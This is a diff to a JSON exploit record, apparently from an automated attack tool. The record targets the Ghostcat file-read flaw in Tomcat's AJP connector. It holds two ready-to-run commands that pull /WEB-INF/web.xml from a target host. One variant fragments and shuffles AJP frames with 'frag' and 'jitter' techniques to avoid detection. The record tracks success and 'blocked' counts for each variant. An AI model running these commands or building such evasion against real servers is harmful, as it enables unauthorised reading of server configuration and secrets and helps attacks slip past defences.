@@ -2,25 +2,48 @@
   "id": "w001",
   "name": "Tomcat AJP 文件读取 (Ghostcat)",
   "family": "exploit/tomcat",
-  "match": {"product": "tomcat", "version": "<9.0.31", "port": "8009"},
+  "match": {
+    "product": "tomcat",
+    "version": "<9.0.31",
+    "port": "8009"
+  },
   "variants": [
     {
       "vid": "v1",
       "desc": "ajpShooter 原始请求",
       "command": "python3 ajpShooter.py http://TARGET:8080 8009 /WEB-INF/web.xml read",
-      "sig": ["ajpShooter", "AJP13", "javax.servlet.include"],
-      "stats": {"tries": 0, "ok": 0, "blocked": 0, "fail": 0},
+      "sig": [
+        "ajpShooter",
+        "AJP13",
+        "javax.servlet.include"
+      ],
+      "stats": {
+        "tries": 0,
+        "ok": 0,
+        "blocked": 0,
+        "fail": 0
+      },
       "streak_fail": 0,
-      "confidence": 0.5
+      "confidence": 0.5,
+      "stack": []
     },
     {
       "vid": "v2",
       "desc": "自组 AJP 帧，属性顺序打散，分片发送",
       "command": "python3 -c \"from ajp_frame import read_file; read_file('TARGET', 8009, '/WEB-INF/web.xml', shard=512)\"",
       "sig": [],
-      "stats": {"tries": 0, "ok": 0, "blocked": 0, "fail": 0},
+      "stats": {
+        "tries": 0,
+        "ok": 0,
+        "blocked": 0,
+        "fail": 0
+      },
       "streak_fail": 0,
-      "confidence": 0.5
+      "confidence": 0.5,
+      "stack": [
+        "tr.frag",
+        "tr.jitter"
+      ]
     }
   ],
   "evasion": {
@@ -29,5 +52,7 @@
   },
   "notes": "先确认 8009 可达且 Tomcat < 9.0.31；v2 需要自备 ajp_frame 脚本。",
   "created_at": "2026-11-15T00:00:00Z",
-  "updated_at": "2026-11-15T00:00:00Z"
+  "updated_at": "2026-11-15T00:00:00Z",
+  "attempts": [],
+  "derived": []
 }
